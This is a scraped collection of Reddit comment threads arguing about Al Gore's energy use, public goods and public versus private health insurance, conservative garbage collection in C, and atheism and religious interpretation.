I guess it depends on what you consider sacrifice.  If you consider sacrifice ""living with a smaller energy bill/carbon footprint than the average American"" then, no - it doesn\'t appear that he has made any sacrifices.\n\n\n\n\n\nIf you consider ""[he bought some hogwash carbon credits](http://www.commondreams.org/archive/2007/04/26/776/) to allow him to continue to use more electricity and gas than TWENTY average Americans in a YEAR"" as sacrifice, then it appears he has made a sacrifice.\n\n\n\n\n\nBut it doesn\'t matter.  You are the one who is obsessed with this irrelevant question.  It doesn\'t matter if Al Gore has made sacrifices or not.  It MATTERS that he preaches to the rest of us that we should make sacrifices to lessen our possible impact on ""global warming"" while he abusively ignores any reasonable limits on his own use of energy.\n\n\n\n\n\nIn the end, you can spin it all you want.  You can ask questions that have nothing to do with the discussion and you can try to drag unrelated people into the discussion - but the fact remains that Al Gore preaches moderation in energy consumption, but he does not practice moderation in energy consumption.  And again, no matter how you try to spin it - at the end of each and every day, I PERSONALLY have contributed LESS GREENHOUSE GAS to the problem than Al Gore - and so have most of the people who are being attacked here. \n\n\n\n\n\nThat is an incredible degree of hypocrisy. ', 'yes', 'Never underestimate the power of 12 stupid people.', '&gt;I mean sacrifice as a normal person would define it.\n\n\n\n\n\nClearly that depends.  If I have 10 million dollars and I buy $1,000 worth of hogwash carbon credits, that might be less of a sacrifice than someone who is scraping by from paycheck to paycheck that decides to spend extra money on compact flourescent bulbs for their house or pays more for a hybrid vehicle.\n\n\n\n\n\nAgain, I have no idea whether Gore has made any sacrifices.  Maybe he REALLY loves those Reveal™ true color lights from GE but he uses CF bulbs instead.  That could be considered a sacrifice.  But not a meaningful one in my opinion.\n\n\n\n\n\n&gt;So you are saying he has made no change at all to his energy usage right?\n\n\n\n\n\nNo.  I am (repeatedly) saying that his energy usage is 20+ times higher than the average American.  And that isn\'t counting the private jets and limos and other ""large carbon footprint"" aspects of his life.\n\n\n\n\n\nIt is really simple.  You can try to dodge the simple fact all you want, but it doesn\'t change the fact.  **Gore doesn\'t practice what he preaches.**\n\n\n\n\n\n&gt;Aahhh the last refuge of the zealot. Accuse somebody of hypocricy if you have nothing else left.\n\n\n\n\n\nNo, I\'m not ""accusing him.""  I\'m showing sourced evidence that he is a hypocrite.  He doesn\'t do what he preaches that the rest of us should do.\n\n\n\n\n\nFurthermore, buying carbon credits is a scam. To begin with, many of them are of little or no real value.  And more importantly, even if they were - they are limited in supply. Or do you think that if we all bought carbon credits equal to our carbon output that we would neutralize the world\'s carbon output?', 'For me it is handy for several reasons:\n\n\n\n\n\n1.

We will sacrifice as many US soliders as it takes, but we will hunt down and kill the environment because we hate the environment.\n\n\n\n\n\n&gt;So you have no problems at all that cheney uses as much if not more energy then gore, you just want to shit on gore because he asks people to use less energy.\n\n\n\n\n\nWhich part of the definition of hypocrisy don't you understand?  If Cheney doesn't believe that man is causing global warming and he doesn't try to force legislation on me that would make me reduce my energy consumption, then he isn't being hypocritical.\n\n\n\n\n\nIf Al Gore does believe that global warming is man-made and he is trying to convince our lawmakers to enact laws that force me to reduce my energy usage, but he consumes 20 times more energy than I already do - then that is being hypocritical.\n\n\n\n\n\nPerhaps an analogy would help.

whereverjustice,t5_6,"['&gt;faceless corporation with thousands of employees\n\n\n\nThis construction has always struck me as odd.', ' The notion that the market sucks at providing public goods is hardly a novel idea.  It\'s generally accepted by most mainstream economists as a classic example of [market failure](http://en.wikipedia.org/wiki/Market_failure).\n\n\n\nA public good is generally defined by two characteristics:  *Nonrivalrousness* and *Nonexcludability*.  The former means that the use of the good by one person does not prevent its use by someone else - if that were the case, we\'d still need an allocation mechanism.  The nonexcludability idea is that you can\'t realistically deny people access to the good.\n\n\n\nThe natural environment is a good example on both counts.  The fact that I enjoy clean air doesn\'t mean that someone else *can\'t* enjoy that same air.  Also, you can\'t sell people access to clean air, because it\'s all around - nonexcludable.\n\n\n\nSince you can\'t charge the beneficiaries of clean air for the cost of maintaining it (because of the nonexcludability), and the benefits go to everyone, mainstream economics theory justifies government action to ensure provision of the public good.\n\n\n\nHealth care is a trickier case.  On the one hand, it\'s can be called both rivalrous and excludable - a hospital bed being used by one person cannot be used simultaneously by another, and you can feasibly prevent people from getting into the hospital.  When a good has these characteristics, we generally ask the government not to intervene in the market.\n\n\n\nBut - and this is how the argument generally goes in Canada, where I live - health care might very well be called nonexcludable because we cannot *morally* deny it to people, even if we *physically* can.\n\n\n\nSo what do we do with something that is rivalrous but nonexcludable?  That\'s what we call a ""common good"" in economics.  But common goods are, in most examples, things like water or wild game - provided naturally.  So the theoretically preferable response to common goods - auction off property rights - doesn\'t work here, because there\'s no incentive toward supply.\n\n\n\nSo we wind up with government paying for hospitals, and supplying single-payer insurance in Canada.\n\n\n\nAs for the USA, you guys (on the left at least) are fighting for health care to be bought into as nonexcludable.  Once that\'s bought into by enough of the electorate, **mainstream economics is on your side**.  It is your friend, not your enemy.\n\n\n\nI\'d advise everyone here to spend a little time listening to economists.  They\'re social scientists and can, from time to time, produce some really interesting ideas, even when they\'re counterintuitive.  Don\'t beat up on an entire scholarly field just because a few of its practitioners - on both the left and right - have some policy prescriptions you disagree with. ', '  Well, in the delivery of most public goods, an inability to opt out is necessary.  For example, imagine you were to say:\n\n\n\n&gt;""The government spends $10 billion annually on cleaning the air.  I do not value clean air, so I would like the government to refund me my share of that money.""\n\n\n\nThis would be a problem, because whether you opt out or not the air is still going to be just as clean - you are reaping the benefits of the clean air, whether you want to pay for it or not, so why *would* you pay for it?  This is called the [free rider problem](http://en.wikipedia.org/wiki/Free_rider_problem).  If everyone goes and opts out, as is in their individual self-interest to do, we would not have any clean air at all.\n\n\n\nTo get around this, we elect governments who promise to provide public goods in the quantities that we feel are appropriate.  Thus, health care and education funding debates.  ']"

Most publicly funded health systems don't have the same wait times or overworked doctors that the US system has.\n\n\n\n&gt; It will probably be impossible to get more working hours from doctors.\n\n\n\nThat I agree with. However, it is entirely possible to a) reduce the need for doctors and b) increase the number of doctors in the system.\n\n\n\n&gt; If the government starts paying for health care, how will that increase the amount of health care provided?\n\n\n\nTalk to doctors in the industry. I know a lot who have retired early because the insurance companies have made it close to impossible for them to operate at a profit.\n\n\n\n&gt; All the government can do is redistribute the care that already exists.\n\n\n\nExactly! Amazingly, this can make a huge difference. Think about the US public health campaigns of the 50's. They worked on improving the health of the *entire* population, because this reduced occurance of disease for everyone. Having 50% of your population without proper health care creates a breeding ground for all kinds of colourful diseases. The best part is that when that 50% reach a life-or-death state, they actually get health care and the costs are effectively distributed to those who have insurance. So, everyone is getting covered, but only when you have very expensive life-or-death types of situations. You also have problems with the profit motive getting in the way of the best distribution of health care. Right now it is way more profitable to be specialist who works on highly complex and expensive procedures used by a few than to be someone who saves lives simply by handing out antibiotics or basic medical advice to the many.\n\n\n\nIn general, private health care tends to do an extraordinary job once you are all the way in to the moral hazard of a life-or-death emergency. It often does this at the expense of taking preventative or basic health care measures that could reduce overall costs while simultaneously improve overall standard of living.\n\n\n\nThe problem is sadly kind of the reverse of the tragedy of the commons."", '&gt; Spoken as somebody that\'s looking to get into the pockets of others. The only guarantee in life is that you will die eventually. the rest is up to you and luck.\n\n\n\nSpoken as somebody who thinks they have enough money that they can buy whatever health care they might need. :-)\n\n\n\nSeriously, the only way to avoid having a system where you don\'t get ""into the pockets of others"" is to ban insurance all together and have people effectively self-insure.\n\n\n\nAlong a similar line of thinking, there is really no need for a military. I mean, if someone tries to kill you because you are getting in their way, that\'s just bad luck, and assembling a military is just ""looking to get into the pockets of others"". It all seems great with anarchist political theory, but in practice communities can benefit from shared interests and spreading the weight from risks.', ""&gt; I should have used the numerous examples of how government has continually screwed up the most simple of tasks I have asked of them.\n\n\n\nFortunately one can't say the same for private enterprise."", ""&gt; You might have a heart of gold for all I know but the people that administer government programs don't tend that way. I've worked for the government, I know, and I didn't give a flying fuck about anything but people not bothering me and getting paid.\n\n\n\nAnd this is terribly different from the folks in private enterprise how? Did you experience some kind of weird ethical conversion when your paycheck stopped coming from Uncle Sam?\n\n\n\nPeople who want the most reward for the least amount of work aren't exactly an unusual phenomenon in any aspect of society. That is one of the reasons why recognition of shared adversity is needed in order to ensure that a community survive."", '&gt; I can\'t speak to all of those you listed, but scientists are not government workers...yet.\n\n\n\nI didn\'t imply that ""scientists are government workers"". I said ""some of the top scientists in the world"" are government workers. That is very much true. Many scientists are employed directly by the government. Off the top of my head the DOE, DOD, NIH and EPA all directly employ scientists, some of which are at the top of their field.\n\n\n\n&gt; Most of the economists brought into government are selected in part because they hold views of economics that allow politicians to feel justified in trying to mess with the economy.\n\n\n\nA trait that is not necessarily incompatible with being one of the top economists. ;-)', ""&gt; Putting a selfish person or persons in charge of a large-scale program of how adversity is to be shared by the masses is a good idea based on this?\n\n\n\nI didn't say that. Of course it'd be best to put a non-selfish person in charge of such a program. Who is more likely to select a non-selfish person for the job: private enterprise or government? ;-)\n\n\n\n&gt; A program the masses have no direct vote on or anything close to direct control as to how it's administered?\n\n\n\nI can't tell whether you think you are talking about government or private health insurance. AFAIK private health insurance never has a direct vote of the people in charge. Public health insurance generally doesn't either, but it would be feasible to do so.\n\n\n\n&gt; I can change my health insurance company but I'm kind of stuck with the US government unless I move, which is not as easy to do.\n\n\n\nActually, if you change your health insurance company, you put yourself at a severe economic disadvantage (you likely lose the leverage of collective bargaining *and* the tax write off). Even if you do so, all you are changing is the brand behind your insurance. It is entirely possible that the new company could even hire the people who were running your old insurance to run the new insurance. It is effectively just as indirect a representation system as government managed health care, if not more so."", '&gt; That might be the case. I suspect this is because either those countries have a greater supply of medical care (caused by less stringent medical licensing, for instance), or a lesser need for it (caused by better general health).\n\n\n\nWell, that\'s a nice theory. The second part is for the most part true, although it would be wrong to assume that this is orthogonal to whether one has public health care or not.\n\n\n\n&gt; a) My girlfriend wants birth control pills. Thanks to the government, she needs a doctors permission first. So instead of providing medical services, a doctor wastes time writing her a permission slip to buy pills.\n\n\n\nBirth control pills aren\'t available over the counter in the US. You need a prescription, and that generally requires a doctor. There are sound medical reasons for this (lots of other forms of birth control are available over the counter because the they are safer medically). Now, one could perhaps make the argument that a nurse or similarly trained medical professional could handle the task, and you may be right. You will find this is in fact done in a number of countries with government insured health care. AFAIK, it isn\'t done by private insured health care. So your assumption that this is imposed by having government insured health care is incorrect.\n\n\n\n&gt; b) My (state) government also does not allow me to get medical assistance from a professional with less than an MD (e.g., a nurse practitioner). So a doctor has to waste his time doing the job of a nurse practitioner, and someone who really needs him can\'t get care.\n\n\n\nAgain, you are confusing medical regulation with medical insurance. Lots of countries with public medical insurance do make these adjustments. Indeed, for a variety of reasons it is easier to implement these kinds of procedures in such an environment.\n\n\n\n&gt; It\'s not like the government redistributed a limited supply of vaccine/knowledge of hygene. They simply produced more. I don\'t think thats possible for the current situation.\n\n\n\nSigh. Let\'s take malaria as an example. They figured out it was cheaper and easier to wipe malaria out entirely than to treat all the people who got sick from it.\n\n\n\nYour missing the point as to *why* more was produced. If you are responsible for everyone, it is cheaper to, for example, raise sanitary conditions for everyone. If you raise sanitary conditions simply for the folks who are enrolled with a particular HMO, it doesn\'t really help that much to reduce even their medical needs, because they still get exposed to disease from the rest of the unsanitary population.\n\n\n\nYou aren\'t going to see HMO\'s footing the bill for improved sanitation systems, garbage disposal, or anything else unless they band together through some kind of collective interest that covers the vast majority of the population, and at that point said entity will be virtually indistinguishable from government anyway.\n\n\n\n&gt; The public health campaigns weren\'t redistributing anything. They were mostly just spreading knowledge/vaccines. Both knowledge and vaccines are easy to make more of. Medical services are harder.\n\n\n\nHey, now you are starting to get it. It is cheaper and easier to do certain things, but there isn\'t a profit incentive for a private health insurance company that represents only a small percentage of the population.\n\n\n\n&gt; Thanks to medical licensing laws, the ""helpdesk"" type medical jobs (giving antibiotics/basic medical advice) are only done by MDs. That\'s as dumb as requiring a Ph.D. before you can clean spyware off people\'s computers.\n\n\n\nThose types of licensing restrictions exist in countries with both private and public health insurance, and they often exist for good reasons. When an MCSE fucks up, people usually don\'t die.\n\n\n\n&gt; This is a problem caused (partially) by the government. I don\'t see how getting them to take money from me and give it to the MD\'s/beaurocrats will fix this.\n\n\n\nBecause, unlike the MCSE, the non-specialist needs almost as much training as the specialist. Furthermore, the non-specialists actually provide the bulk of the ""value"" in terms of health care (as you correctly point out, the vast majority of the time you don\'t need a specialist for your health care needs). By creating a shortage of the non-specialists you actually *increase* the need for specialists, which in turn increases your overall medical costs. It works in a private health care system because it increases the incidence of the most severe moral hazards in the whole economics of medicine, so you can justify the higher cost and you even get higher patient satisfaction rates. What you don\'t get is better health care at a lower cost.', ""&gt; Why does everyone think private businesses will hold their prices at a certain level and cut out all poor people? Adding a second business into that situation seems solve that problem.\n\n\n\nStrange then that so many people don't have insurance in the US *and* per capita medical costs are higher in the US than anywhere else. This despite having longer wait times, poorer health conditions, etc. than most of the rest of the industrialized world.\n\n\n\nPrivate businesses will hold their prices at the most profitable levels. That means they'll shave 10% off the price if they think it will increase profits. They won't do it if it reduces profits. It also means they won't spend money on preventive health care, because most of the time the benefits of prevention won't come back to them (odds are pretty good that some other company will be covering the person when they get sick, plus preventive health care for the general population often won't make economic sense, etc.)."", '&gt; Get back to me when you have a method to rid yourself of deadwood government bureaucrats.\n\n\n\nGet back to me when you have a method to rid yourself of deadwood bureaucrats in private enterprise. ;-)\n\n\n\n&gt; Try googling ""agency capture"".\n\n\n\nSigh. Okay, imagine a world where such government agencies simply don\'t exist. Who sets the rules then.... the private enterprises providing the services you were so worried were controlling the government agencies...\n\n\n\nPrivate enterprises wield influence in order to protect their interests, regardless of the existence of government agencies or not. Such is life.', ""&gt; I'm not allowed a choice of which governmental agency I like best unless I move.\n\n\n\nAgain, I don't see how this is relevant. At least with a governmental agency you have some additional leverage in the form of your vote. If it didn't exist, you'd be just as screwed... only you'd have lost that additional leverage available to you.\n\n\n\nPeople seem to have these weird idea that if the agencies go away, so does the influence of the businesses they regulate. The agencies aren't the *cause* of the phenomenon behind agency capture. They are merely a symptom of it."", ""&gt; I guess it depends on what school of economic thought you consider to be correct.\n\n\n\nNo. Fortunately one can evaluate the quality of  an economist independent of one's beliefs about economics. Sadly, recognition of this has become rarer as science and academics have become increasingly politicized. It is not at all uncommon to have people in the field totally disagree with someone and yet recognize that they are one of the top minds in the field."", '&gt; You are making me laugh thinking your vote matters.\n\n\n\nYou are making me laugh for implying that having no vote provides one with more influence than having a vote.\n\n\n\n&gt; Are you old enough to remember those years?\n\n\n\nYes.\n\n\n\n&gt; Not having a choice of ""agency"" changes things a lot. Monopolies are not a good thing. Oligarchies are bad but not as bad as monopolies.\n\n\n\n""agency capture"" as a phenomenon occurs with oligarchies just as much as with monopolies. Often you find the phenomenon is actually worse with oligarchies. More importantly, insurance companies are closer to an oligarchy than medical practitioners (by a function of the sheer larger numbers of medical practitioners), so I\'m not sure I see where things get worse here.', '&gt; You will soon find out where they get worse.\n\n\n\nYou incorrectly presume ignorance.\n\n\n\n&gt; Biggest thing, regarding why national health-ish things are stupid, and the one you won\'t like as an idealist, is that insurance companies can say NO to people and the government won\'t be able to.\n\n\n\nYou are even more incorrect to suggest that I am an idealist. I have lived under both public and private insurance systems and have a very practical understanding of their application.\n\n\n\nIn practice, public insurance systems say NO to people all the time. Interestingly, because people are indirectly paying for their insurance there is actually less of a sense of entitlement on the part of individuals and MUCH less so on the part of the larger public. You see this in the statistics for the kinds of treatments (particularly the expensive ones) that are provided on a per-capita basis in the US vs. other industrialized nations.\n\n\n\nFurthermore, in practice, insurance companies often say NO to a treatment that will prevent more substantial costs at a later date. Even worse, they aren\'t even asked if someone is uninsured. However, once a situation is life-or-death, insurance companies are required to cover them. Even worse, even if the insurance companies aren\'t required, frequently hospitals/doctors are required to treat them, which then leads to the whole bankruptcy cycle. That means the costs do get absorbed by those of us with insurance. So even when you are naively thinking that you aren\'t having to pay for the medical care of all those people who can\'t afford it, you are, in a manner that is far more expensive than public health insurance (not to mention the negative consequences for your own health that stem from this).\n\n\n\nThe one area where the US health care system tends to beat the rest of the world is patient satisfaction. A large part of the reason for this is that the system is far less likely to tell a patient ""NO"". Why? There are a lot of reasons, not the least of which are lawsuits (which work a lot better when life-or-death decisions can be attributed to a profit motive rather than merely triage).\n\n\n\n&gt; Bureaucrats would rather spend the money than tell people that some people need to die because it isn\'t cost effective to keep them around and risk to get sued or lose their jobs.\n\n\n\nThere seems to be this weird notion that bureaucratic type folks only exist in government. One can only conclude that these folks have somehow managed to avoid both working for and dealing with large corporations, like most insurance companies, in any significant way. Only, that seems practically impossible.', ""&gt; If by top you mean influential...\n\n\n\nNo, I do not mean influential. I am referring to their skill in the field.\n\n\n\n&gt; ..most of those top economists, for the last 90 or so years, have been terrible for people economically and freedom wise...\n\n\n\nWell, economics may lead to more or less freedom (I'd argue that on we've got more than we used to have although recent trends are worrisome, but I'm not sure how much of that could be attributed to economists), but neither is a reflection on the quality of the economics. As for the economic track record of the last 90 years or so... it has been, for America, one of the best track records around.\n\n\n\nUltimately though, those factors are at best side issues. A good economist is one who expands our understanding of economics, and the more new understanding they produce, the better.\n\n\n\nPerhaps sometimes that may actually lead or allow people applying that understanding to do things that cost us economically (although normally you'd think increased understanding would result in economic gains). Either way, that is again NOT the primary indicator of the quality of an economist."", ""&gt; Health care providers get their supplies from the same suppliers. If some providers have huge amounts of government money, the cost of supplies will, as they have been, go up in price.\n\n\n\nThis is clearly demonstrated by the US paying significantly more per capita for health care than any other country (so much so that the government portion of that bill is actually higher than the spending in other industrialized countries that only have public health care) and yet having worse outcomes.... oh wait.\n\n\n\n&gt; Private practices won't have access to that kind of money since their income comes from only individuals who don't have that much government money.\n\n\n\nIt very much depends on their clientèle. Plastic surgeons in Beverly Hills do a lot better than army doctors.\n\n\n\n&gt; Also, in Louisiana (maybe in other states too, don't know that for sure) it has effectively become impossible for an individual doctor to start a private practice that does not take medicare and such.\n\n\n\nInterestingly, in other parts of the country doctors have stopped taking medicare patients because they profit more from non-medicare patients."", '&gt; For example, in Canada it is (or until recently, ""was"", but I\'m not sure) straight-up illegal for a doctor to practice medicine outside of the government medical system. He literally could not give you medical advice on his own time.\n\n\n\nThat\'s not true. [Wikipedia does a great job explaining the situation in Canada](http://en.wikipedia.org/wiki/Health_care_in_Canada#Private_sector). Almost all doctor\'s operate as private entities, and about 30% of all medical expenses are covered by private insurance (mostly services that aren\'t covered or that require a co-pay).\n\n\n\nCanada has public health *insurance*, which is very different from public health *services* (they have that too, but not really in a way that is much different from the US).', '&gt; Almost all doctor\'s operate as private entities.\n\n\n\nSorry, I tried to correct that.

You can legally cast these to and from some integer type, so the compiler can\'t reliably generate type information that the GC can use to know what words are pointers.\n\n\n\nOne response is ""conservative"" GC, which is a hack that assumes that any word that looks like a valid memory address is one.  It\'s unsafe because you can do arithmetic on pointers (if you have &amp;(a[5]) somewhere, it\'s not safe to collect a; if you have the xor of two pointers because you like tricky doubly-linked lists, it\'s not safe to collect either of the nodes you xored the pointers to).  It\'s leaky because sometimes you just happen to have a number that looks like an address.  A conservative GC also isn\'t allowed to move anything (it can\'t reliably find all the pointers to an object because some may be hidden, and there may be some false-positive ints lying around), so the heap can get fragmented.\n\n\n\nI think ""doing closures right"" includes the ability to return them.

A few points:\n\n\n\n* Most of her criticisms aren't of religious people attacking atheists specifically, but people they disagree with generally (which includes many others). Atheists are attacked by extension whenever evolutionists or 21st-century sexual norms are attacked, for example, because those categories include virtually all atheists.\n\n* Many of her criticisms aren't of specific, explicit attacks, but an oppressive system that often is just quietly efficient. When her and her partner want to get married, there's no vitriolic attacks by Christians on the way to the courthouse. They simply are denied permission by a bureaucrat, with no realistic appeal. Which is much worse.\n\n\n\nWhich is why I would say she's basically right in her closing paragraphs. The anger of atheists is much, much, much less than the real, tangible oppression (plus anger to boot) of religious people.  "", 'Downmodded for not bothering to write out the damn verse or even provide a link.', 'I\'m talking about living people, so even if Lysenko (a) was not an evolutionist and (b) had many followers in Russia in the early 20th century, it doesn\'t undercut my point.

Hating queers/ rejecting science/ stifling questions and dissent... that\'s not the true faith. People who do that aren\'t real (Christians/ Jews/ Muslims/ Hindus/ etc.)."" **As if they had a fucking pipeline to God. As if they had any reason at all to think that they know for sure what God wants, and that the billions of others who disagree with them just obviously have it wrong.** (Besides -- I\'m an atheist. The ""They just aren\'t doing religion right"" argument is not going to cut it with me. **I don\'t think any of you have it right. To me, it all looks like something that people just made up.**)\n\n\n\nAnd the next paragraph:\n\n\n\n&gt;On that topic: **I get angry when religious believers insist that their interpretation of their religion and religious text is the right one, and that fellow believers with an opposite interpretation clearly have it wrong.** I get angry when believers insist that the parts about Jesus\'s prompt return and all prayers being answered are obviously not meant literally... but the parts about hell and damnation and gay sex being an abomination, that\'s real. **And I get angry when believers insist that the parts about hell and damnation and gay sex being an abomination aren\'t meant literally, but the parts about caring for the poor are really what God meant. How the hell do they know which parts of the Bible/ Torah/ Koran/ Bhagavad-Gita/ whatever God really meant, and which parts he didn\'t? And if they don\'t know, if they\'re just basing it on their own moral instincts and their own perceptions of the world, then on what basis are they thinking that God and their sacred texts have anything to do with it at all? What right do they have to act as if their opinion is the same as God\'s and he\'s totally backing them up on it?**  ', ' Sure, there are positive things we can glean from religion as we build the post-religious future for humanity.\n\n\n\nBut you haven\'t addressed her point. Her point is that moderates have no more basis -- if anything, less -- for their interpretation of their scriptures/traditions than any other movement in the same tradition. \n\n\n\nIn the case of Christianity, the Bible and the Christian tradition are very large, with many self-contradictory elements. Who gets to decide which are the most important ones, and which are the ones we can dismiss? Anyone and no-one, basically arbitrarily in each case. ""True Christianity"" is simply a pompous way of saying ""the version of Christianity that I like the most.""\n\n\n\nThat\'s what happens in discourses that ultimately depend on arguments from authority (and contradictory authority at that), rather than reason and evidence.  ', "" Your last three sentences are perfectly correct. But the fact that you think they're relevant here shows that you could benefit from a course in basic set theory. Let's look at what I actually said:\n\n\n\n&gt;Atheists are attacked by extension whenever evolutionists or 21st-century sexual norms are attacked, for example, because *those categories include virtually all atheists.*\n\n\n\nTo restate, I'm claiming that (1) most living and self-identified atheists are evolutions, and (2) most living and self-identified atheists see safe sex between consenting adults as good regardless of the genders, etc. of the people involved. Those claims are true, and I challenge you to show any evidence to the contrary.\n\n\n\nI did not claim any of the following: (1') that *all* atheists are evolutionists, (2') that *all* atheists are sexually enlightened, (3) that all evolutionists are atheists, or (4) that all sexually enlightened folks are atheists."", '  Ethics? Sure, it\'s as you say. What was your question exactly, and how is it relevant? (No cleverness involved in my lack of response to that, just didn\'t see the point.)\n\n\n\n&gt;Essentially she is saying no one can make any claims because no one has any basis from which to judge the underlying. \n\n\n\nWhich is true. How shall we determine the true Christianity from the false? Is it the authority of the Church? (Then which church?) Or the Bible? (Then which canon, which version, and which parts?) The inward light of the Quakers, the reason of the Socinians, etc.? (Then according to whom?)\n\n\n\n&gt;Which again assumes there are no societal successes attributable to the underlying.\n\n\n\nNo, it doesn\'t. You can believe that (1) religion is wholly/partly responsible for this or that social good, and that (2) the arguments over which is the ""truest"" form of Christianity/etc. are futile and groundless.\n\n\n\nYou seem to be saying that the basis upon which we should judge religions is their ""societal successes,"" or what they\'ve contributed to humanity. On that basis, sure, Sermon-on-the-Mount Christianity is ""better"" than most other kinds. \n\n\n\nBut that doesn\'t make it ""more"" Christian or more truly Christian. Take Islam, for example. The ""best"" version of Islam would be one which doesn\'t advocate killing apostates, spreading Islam by force, killing adulteresses and gays, etc. etc. etc. – and yet this ""best"" (by Western society\'s standards) kind of Islam would NOT be the most Islamic (by the tradition\'s own standards)\n\n\n\nAnd propagation doesn\'t necessarily mean there\'s a benefit (though I do think there has been some). Viruses stay with us too, you know...  ', ' &gt;""But that doesn\'t make it ""more"" Christian or more truly Christian.""\n\n\n\n&gt;So if you believe in the concept of literary analysis, you certainly can do a textual analysis of the religious text and get a pretty good answer to this question.\n\n\n\nOh rly? And what\'s the pretty good answer? Have you let the rest of the church know? Let me know how that turns out.\n\n\n\n&gt;So this is an interesting argument, but usually those viruses that stay with us engage in some type of symbiosis. \n\n\n\nSuch as?\n\n\n\n&gt;the search for a non-divine inspired codex that resembles the best features of the Bible has been going on for centuries.\n\n\n\nNot sure what planet you\'re living on, but you\'d be hard pressed to find more than a small minority of moral philosophers today who expect us to find anything like a ""codex resembling the Bible.""\n\n\n\nIn any case, this has very little to do with the subject at hand. You suggested that right-of-Jim-Wallis Christianity is ""false"" and that you\'ve discovered ""true"" Christianity, which is baloney. As I said, the fact that ethics may salvage a thing or two from particular Christian thinkers is a completely independent topic.\n\n\n\nMoving back on topic:\n\n\n\n&gt;""How shall we determine the true Christianity from the false? ...""\n\n\n\n&gt;And so we see your assumption of the impossibility of this task assumes there is no possible metric, because apparently we have reached some kind of Godel like paradox. \n\n\n\nIf you have a metric, you can answer my question. What is it? A church? Certain passages? Whatever-smacfarl-says? \n\n\n\nI\'ll admit that there is one possible metric. Religion could change from being based on superstitiously-arrived-at and dogmatically-maintined axioms, with no clear and generally-agreed-upon rules of dialogue, to being a discourse based on evidence, open to revision. \n\n\n\nProblem is, on that metric – which ultimately is the only one that deserves any respect in the modern world – religion, including the be-good-because-Jesus-says-so kind of religion, can only be deconstructed away into humanism. ', 'I\'ve addressed everything you\'ve said. You just don\'t like the answers. \n\n\n\nYou\'re the one not answering my question, which I\'m asking a third time now, in italics so you don\'t miss it: *What basis do you have for believing that your brand of Christianity is more legitimate than anyone else\'s?* Be very specific - if you can. \n\n\n\nAnd you can\'t just argue ""we as a society like X brand over Y,"" you have to show why, on Christianity\'s terms, X is ""more Christian"" than Y.\n\n\n\nThis is the issue the thread began with (when you claimed you knew what ""actual"" Christianity was). You didn\'t say ""Christianity which I find more beneficial to humanity""; you said ""actual."" \n\n\n\n---\n\n\n\nAs for the completely separate issue of ethics and humanism, which is beginning to look more and more like smoke and mirrors meant to distract from your inability to give a straight and clear answer to the above question, I will repeat for a *third time* (see ""Ethics?..."" and ""Sure..."" in the first lines of two comments above) that it\'s quite true that ethics/humanism have and will continue to learn from the past ethical heritage of humanity, which includes both religious and pagan ideas.\n\n\n\nNo one was questioning that. The author even said somewhere that we shouldn\'t claim religion has nothing to be proud of. \n\n\n\nYou were and still are bringing in your own preoccupations that are only tangentially relevant to the conversation.']"
